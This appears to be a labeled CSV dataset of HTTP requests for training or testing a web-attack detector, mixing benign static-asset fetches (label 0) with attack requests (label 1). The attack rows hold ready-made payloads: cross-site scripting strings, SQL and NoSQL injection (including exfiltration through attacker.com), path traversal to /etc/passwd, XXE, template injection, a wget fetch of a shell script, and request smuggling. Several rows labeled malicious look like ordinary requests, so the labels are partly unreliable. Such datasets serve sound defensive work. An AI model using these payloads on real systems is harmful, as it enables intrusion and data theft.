method,path,query,headers,body,ua,label
GET,/static/js/insert-handler-idZWshee.css,,,HTTP/1.1,,0
GET,/static/css/drop.jpg,,,HTTP/1.1,,0
GET,/static/js/delete.min.js,,,HTTP/1.1,,0
GET,sometext<svg onload=alert(document.domain)>?mimeType=text/html,,,,,1
GET,/,"""onwheel=ead(111)",,,,1
GET,"<video><source onerror=""alert(1)"">",,,,,1
GET,..%252f..%252f..%252fetc%252fhosts,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/static/js/cat.jpg,,,HTTP/1.1,,0
GET,/static/css/whoami.png,,,HTTP/1.1,,0
GET,/build/insert.png,,,HTTP/1.1,,0
GET,/media/select.min.css,,,HTTP/1.1,,0
GET,<!<script>alert(document.domain)</script>,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,id=1; SELECT pg_sleep(5)--,,,,,1
GET,/,"/""));if(!self.x)self.x=!alert(document.domain)}catch(e){}/","User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/static/js/select-image-zHH6y7a2.css,,,HTTP/1.1,,0
GET,/build/form-whoami-3AhhHjg6.jpg,,,HTTP/1.1,,0
GET,/build/from-date-JGZVfp44.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,User-Agent: ' OR SLEEP(5) OR ',,,,,1
GET,/assets/delete-tag-A1zcbYs8.js,,,HTTP/1.1,,0
GET,/,/&lt;svg/onload&equals;alert(1)&gt;,,,,1
GET,/,url=http://malicious.com,,,,1
GET,/build/image-where-rslxYmsY.js,,,HTTP/1.1,,0
GET,/static/js/cat.png,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/js/where.css,,,HTTP/1.1,,0
GET,/,,,,,0
GET,"alert.apply(null, [1])",,,,,1
GET,"<!DOCTYPE foo [ <!ELEMENT foo ANY ><!ENTITY xxe SYSTEM ""http://host/ text.txt"" > ] > <foo>&xxe;</foo>",,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,;var date = new Date(); do{curDate = new Date();}while(curDate-date,,,,,1
GET,java\tscript:alert(1),,,,,1
GET,/static/js/icon-delete-28UsYQwY.png,,,HTTP/1.1,,0
GET,/assets/menu-update-KKkJyzih.woff2,,,HTTP/1.1,,0
GET,/static/js/function-delete-qocbu28Q.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/build/delete.svg,,,HTTP/1.1,,0
GET,/,"/""));if(!self.x)self.x=!alert(document.domain)}catch(e){}/",,,,1
GET,/build/where.jpg,,,HTTP/1.1,,0
GET,/,"javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\""/+/onmouseover=1/(f=prompt,f(1))//'>",,,,1
GET,/static/js/handler-union-Up0vQ2fh.png,,,HTTP/1.1,,0
GET,/assets/onerror-row-l4X8SBd7.png,,,HTTP/1.1,,0
GET,/build/script-handler-YAaLlcbf.svg,,,HTTP/1.1,,0
GET,/assets/drop-button-1vMjyALS.jpg,,,HTTP/1.1,,0
GET,/assets/cat-form-9kV71HcT.woff2,,,HTTP/1.1,,0
GET,/api/workspaces/insky/projects/bce0a79c-90d2-4558-9084-945ad6acbdae/issues/,group_by=state_id&order_by=-created_at&sub_issue=true&filters=%7B%22created_by_id__in%22:%22d5bfcc01-0096-4c85-a741-3309c3099472%22%7D&layout=kanban&cursor=30:0:0&per_page=30&xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=setInterval(%27fet%27+%27ch(document.domain)%27),"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/static/css/drop.js,,,HTTP/1.1,,0
GET,QUIT,,,,,1
GET,/media/cat-widget-2jefV0YI.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,cat /etc/passwd,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,"<foo xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include href=""file:///etc/passwd""/></foo>",,,,,1
GET,"id=1' AND 1=CONVERT(int, (SELECT password FROM users LIMIT 0,1))--",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,; cat /etc/passwd,,,,,1
GET,union select,,,,,1
GET,/,?75affb26b7=%3CxssBypass%2Fonpointermove=%28confirm%29%281%29%3EMoveMouseHere,,,,1
GET,/static/js/zone-delete-w0lgic6E.png,,,HTTP/1.1,,0
GET,"id=1 AND (SELECT LOAD_FILE(CONCAT('\\', (SELECT password FROM users LIMIT 0,1), '.attacker.com\a')))",,,,,1
GET,<script>alert('XSS')</script>,,,,,1
GET,/build/update.min.js,,,HTTP/1.1,,0
GET,/assets/type-union-DfMocfkP.css,,,HTTP/1.1,,0
GET,/static/js/form-delete-Qekdub72.woff2,,,HTTP/1.1,,0
GET,/build/delete-row-BJLCtyKD.svg,,,HTTP/1.1,,0
GET,/assets/dialog-script-FH1uEm6M.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/js/insert.min.js,,,HTTP/1.1,,0
GET,/static/css/eval-clause-iN3bN4B3.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/,?155ec55483=%253Cx%2FOnpointerrawupdate=confirm%2526lpar%3B%29%253Exxxxx,,,,1
GET,/assets/button-alert-yCZZxeen.jpg,,,HTTP/1.1,,0
GET,;wget http://some_host/sh311.sh,,,,,1
GET,/media/eval-form-1gMTk4Vy.css,,,HTTP/1.1,,0
,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,0
GET,/,?a8aafb9364=%3Cimg%20src%20onerror=confirm%281%29%3E,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,..%252f..%252f..%252fetc%252fhosts,,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/,<xssBypass/onpointermove=(confirm)(1)>MoveMouseHere,,,,1
GET,/,*(|(objectclass=*)),,,,1
,/favicon.ico,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,0
GET,/static/js/clause-cat-lSuEGupL.css,,,HTTP/1.1,,0
GET,/,"<svG/x="">""/oNloaD=confirm()//","User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/media/drop.svg,,,HTTP/1.1,,0
GET,/static/js/eval-menu-HdE3RIV7.png,,,HTTP/1.1,,0
GET,/static/css/eval.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/build/tag-eval-af1OjWrO.svg,,,HTTP/1.1,,0
GET,/media/button-select-MOIBcLJA.png,,,HTTP/1.1,,0
GET,/build/image-insert-Wl3uRRnr.css,,,HTTP/1.1,,0
GET,<img src onerror=confirm(1)>,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,../../../../etc/passwd,,,,,1
GET,/static/js/script.min.css,,,HTTP/1.1,,0
GET,/media/handler-select-O5pDtynQ.jpg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/media/drop-icon-N4pTZTIw.js,,,HTTP/1.1,,0
GET,/build/delete-button-1yfYJcn0.svg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,"<svG/x="">""/oNloaD=confirm()//",,,,1
GET,/media/widget-insert-djmklAry.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/assets/widget-select-54v6s1Sg.svg,,,HTTP/1.1,,0
GET,/assets/delete.min.css,,,HTTP/1.1,,0
GET,/static/css/eval.min.js,,,HTTP/1.1,,0
GET,/assets/image-alert-ctUESstB.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,"eval(atob(""YWxlcnQoKQ==""))","User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/media/update.woff2,,,HTTP/1.1,,0
GET,javascript:setInterval('con'+'firm(document.domain)'),,,,,1
GET,"', $or: [ {}, { 'order':'order",,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/static/js/where-type-EjLPnSuq.jpg,,,HTTP/1.1,,0
GET,/static/css/cat.png,,,HTTP/1.1,,0
GET,/assets/update.min.js,,,HTTP/1.1,,0
GET,/build/whoami.min.js,,,HTTP/1.1,,0
GET,/build/alert-function-IhiyOFzm.svg,,,HTTP/1.1,,0
GET,/static/js/where-button-oaYX8epS.jpg,,,HTTP/1.1,,0
GET,"""><p only=1337 onmouseenter=window.location.href=//attacker.site>",,,,,1
GET,/static/css/clause-script-jaNkxGCZ.jpg,,,HTTP/1.1,,0
GET,/static/js/update.min.css,,,HTTP/1.1,,0
GET,php://input,,,,,1
GET,/static/css/update-handler-PDj6AkBM.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,/static/css/update-type-NZV9YM3F.svg,,,HTTP/1.1,,0
GET,' or '1'='1,,,,,1
GET,/,"""));if(!self.x)self.x=!alert(document.domain)}catch(e){}//",,,,1
GET,/build/alert.jpg,,,HTTP/1.1,,0
GET,/static/css/update-type-kK0huhMR.png,,,HTTP/1.1,,0
GET,"<#assign ex = ""freemarker.template.utility.Execute""?new()>${ ex(""i d"")}",,,,,1
GET,`curl -L http://ⒼⓄⓄⒼⓁⒺ.ⒸⓄⓂ`,,,,,1
GET,/build/image-alert-OyZbdIXF.woff2,,,HTTP/1.1,,0
GET,/,(&(uid=admin)(|(password=*))),,,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,------------------------------------------,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,,,1
GET,/,userPassword:2.5.13.18:=123,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,Host: evil.com,,,,,1
GET,/assets/button-onerror-RMNMcflD.woff2,,,HTTP/1.1,,0
GET,/build/icon-update-dz4W5MfQ.jpg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,"<iframe srcdoc=""<script>alert(1)</script>"">",,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
POST,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*","{""username"": {""$gt"": """"}, ""password"": {""$gt"": """"}}",,1
GET,/static/css/script.jpg,,,HTTP/1.1,,0
GET,../../../../etc/passwd,,,,,1
GET,X-Forwarded-Host: attacker.com,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/build/handler-whoami-N6nmhcQB.woff2,,,HTTP/1.1,,0
GET,/assets/icon-insert-Uor5OeNW.css,,,HTTP/1.1,,0
GET,%253cscript%253ealert(1)%253c/script%253e,,,,,1
GET,/static/css/from.min.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/static/js/button-select-IHZcWSIU.woff2,,,HTTP/1.1,,0
GET,/build/whoami.woff2,,,HTTP/1.1,,0
GET,/,?selectPromotionId=986205&sku=%3Cscript%3Ealert%28%27XSS%27%29%3C%2Fscript%3E,,,,1
POST,/,,,"{""$where"": ""function() { return this.name == 'admin' }""}",,1
GET,<script>alert('XSS')</script>,,,,,1
GET,/build/from-image-HQWVfgZJ.woff2,,,HTTP/1.1,,0
GET,/static/js/script.css,,,HTTP/1.1,,0
GET,/build/union.css,,,HTTP/1.1,,0
GET,/,/uploads/628668cae9db4d51b4edf55214b73fca-Facebook-Image.jpg?response-content-disposition=inline%3B%20filename%2A%3DUTF-8%27%276b67c704b68a4517aa6664c1df2f7afe&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=9wnmzzHYVGwlnTscRdzx%2F20260310%2F%2Fs3%2Faws4_request&X-Amz-Date=20260310T023341Z&X-Amz-Expires=3600&X-Amz-SignedHeaders=host&X-Amz-Signature=5bfffbe1cc40d1ef12ee72b2126381daf34408143c87a1c0bf11e66c162e101b&q=%27or%201=1;--,,,,1
GET,"<video src=x onerror=""prompt(xss"">",,,,,1
GET,/build/row-select-C4gc9wHn.png,,,HTTP/1.1,,0
GET,/,id=0x27204f52202731273d2731,,,,1
GET,/media/cat-function-u6OjtCwU.js,,,HTTP/1.1,,0
GET,/assets/handler-union-FG9T8zea.css,,,HTTP/1.1,,0
GET,id=1; SELECT pg_sleep(5)--,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: api.internal
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: www.mysite.com
Accept: */*",,,1
GET,id=1; DROP TABLE users--,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/media/union.min.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: app.local
Accept: */*",,,1
GET,/,"/""onClick=""(prompt)(1)",,,,1
GET,..%c0%af..%c0%af..%c0%afetc/passwd,,,,,1
GET,../../../../etc/passwd,,,,,1
GET,/build/select.woff2,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/build/drop.js,,,HTTP/1.1,,0
GET,/static/js/whoami.css,,,HTTP/1.1,,0
GET,javascript:alert(1),,,,,1
GET,/static/js/clause-from-ArWsRlEk.jpg,,,HTTP/1.1,,0
GET,/media/script.min.css,,,HTTP/1.1,,0
GET,/assets/alert.jpg,,,HTTP/1.1,,0
GET,/static/js/alert-image-grLkWcnt.js,,,HTTP/1.1,,0
GET,/media/alert-type-cxB3Zoag.svg,,,HTTP/1.1,,0
GET,/,,,HTTP/1.1\r\nHost: target.com\r\nContent-Length: 42\r\n,,1
GET,/,__proto__[admin]=true,,,,1
GET,/,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/static/js/drop.css,,,HTTP/1.1,,0
GET,"alert.call(%20, ""XSS"");",,,,,1
GET,/assets/whoami-type-s8IehwuF.svg,,,HTTP/1.1,,0
GET,/assets/select.min.css,,,HTTP/1.1,,0
GET,/static/js/where.min.css,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/assets/whoami-tag-79TUvAky.svg,,,HTTP/1.1,,0
GET,/build/cat.woff2,,,HTTP/1.1,,0
GET,/assets/alert-row-u9S2BG6H.png,,,HTTP/1.1,,0
GET,/build/from.woff2,,,HTTP/1.1,,0
GET,/build/where-button-AhhVG3os.woff2,,,HTTP/1.1,,0
GET,/,ax--exec=`id`--remote=origin,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/assets/update.woff2,,,HTTP/1.1,,0
GET,/,"""//Onx=""""//onfocus=prompt(1)>",,,,1
GET,../../../../tmp/shell.php (inside zip archive),,,,,1
GET,/build/select-clause-kHooiXUq.woff2,,,HTTP/1.1,,0
GET,/build/select.min.js,,,HTTP/1.1,,0
GET,Transfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1,,,,,1
GET,/build/drop-widget-aSmbJYEq.svg,,,HTTP/1.1,,0
POST,/,,,"{""$gt"": """"}",,1
GET,"<?xml version=""1.0"" encoding=""UTF-7""?> +ADwAIQ-DOCTYPE foo+AFs +ADwA IQ-ELEMENT foo ANY +AD4 +ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack- r.be:1337+ACI +AD4AXQA+ +ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4",,,,,1
GET,/assets/where.min.js,,,HTTP/1.1,,0
GET,/index.php?name=Guest%0d%0aSet-Cookie: session=1,,,,,1
GET,(select(0)from(select(sleep(15)))v)/*'+(select(0)from(select(sleep(1 5)))v)+'%22+(select(0)from(select(sleep(15)))v)+%22*/,,,,,1
GET,/build/whoami.min.css,,,HTTP/1.1,,0
GET,/static/css/delete.js,,,HTTP/1.1,,0
GET,javascript:%ef%bb%bfalert(XSS),,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/media/eval.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/,?8dfc44c3c7=%28xss%22%3E%3C%21--%3E%3Csvg%2Fonload=alert%28document.domain%29%3E%29,,,,1
GET,/,?34ea04b04c=%3CIMG%20SRC=j&%23X41vascript:alert%28%27test%27%29%3E,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: example.com
Accept: */*",,,1
GET,/,,"User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1
Host: app.local
Accept: */*",,,1
GET,query { a: user(id:1) { name } b: user(id:2) { name } },,,,,1
GET,/,"""//Onx=""""//onfocus=prompt(1)>","User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/media/image-delete-4U9Eej5m.jpg,,,HTTP/1.1,,0
GET,/static/js/union.jpg,,,HTTP/1.1,,0
GET,Content-Length: 4\r\n\r\n1234,,,,,1
GET,/assets/script-row-mUsyK89C.png,,,HTTP/1.1,,0
GET,/static/css/icon-onerror-swIaPtRE.js,,,HTTP/1.1,,0
GET,/media/script.svg,,,HTTP/1.1,,0
GET,/static/js/select.js,,,HTTP/1.1,,0
GET,/static/js/drop.jpg,,,HTTP/1.1,,0
GET,../../../../etc/passwd%00,,,,,1
GET,/static/css/eval.js,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,/build/tag-drop-rYmgwxVq.jpg,,,HTTP/1.1,,0
GET,/,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/static/css/cat-date-i2RQBtUc.svg,,,HTTP/1.1,,0
GET,"<iframe src=""java sc ript:al ert()""></iframe>",,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: api.internal
Accept: */*",,,1
GET,/assets/where-date-0skWtH5A.woff2,,,HTTP/1.1,,0
GET,/static/js/eval.js,,,HTTP/1.1,,0
GET,expect://id,,"User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: example.com
Accept: */*",,,1
GET,id=1' OR '1'='1,,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Host: www.mysite.com
Accept: */*",,,1
GET,/static/js/update.css,,,HTTP/1.1,,0
GET,/,/inskyXss?db=monasca&q=SELECT%20mean(%22value%22)%20FROM%20%22mem.used_perc%22%20WHERE%20%22resource_id%22%20%3D~%20%2F%5Ebfb959fd-8128-4a68-98c7-d062ebd2dc4b%2F%20AND%20time%20%3E%3D%20now()%20-%206h%20and%20time%20%3C%3D%20now()%20GROUP%20BY%20time(1m)%2C%20resource_id&epoch=ms,,,,1
GET,' or '1'='1,,,,,1
GET,${os.system('id')},,,,,1
GET,/static/js/from.js,,,HTTP/1.1,,0
GET,/build/update-tag-buDi4vEU.js,,,HTTP/1.1,,0
GET,/static/js/alert-date-aDPTns7p.css,,,HTTP/1.1,,0
GET,/static/js/icon-delete-wAQNTuiY.svg,,,HTTP/1.1,,0
GET,select from,,,,,1
